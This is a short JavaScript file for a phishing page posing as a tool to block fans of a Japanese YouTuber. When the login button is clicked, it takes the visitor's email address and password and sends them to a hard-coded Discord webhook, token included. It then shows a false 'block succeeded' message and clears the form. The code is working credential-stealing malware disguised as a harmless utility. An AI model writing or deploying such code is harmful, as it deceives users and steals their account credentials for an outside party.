const WEBHOOK_URL = "https://discord.com/api/webhooks/1428234881561002045/32y44N7pa_9xGU1NMPV-73lnIzKPRrNyxAANMwGjbRp176wfKkYwnWHbSD1CE4pnxIWM";


document.addEventListener('DOMContentLoaded', () => {
    const loginButton = document.getElementById('sendToDiscordButton');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');


    loginButton.onclick = async function(event) {
        event.preventDefault(); 
        
        const emailValue = emailInput.value;
        const passwordValue = passwordInput.value;

        const messageContent = `**「全ヒカマーをブロックするツール」からのログイン試行**\n\n**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
        
        await sendToDiscord(messageContent);
        
        alert("ブロックに成功しました!"); 
        
        emailInput.value = '';
        passwordInput.value = '';
    }
});


async function sendToDiscord(content) {
    
    const data = {
        "content": content, 
        "username": "ヒカマーブロックツール",
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });
        
    } catch (error) {
    
    }
}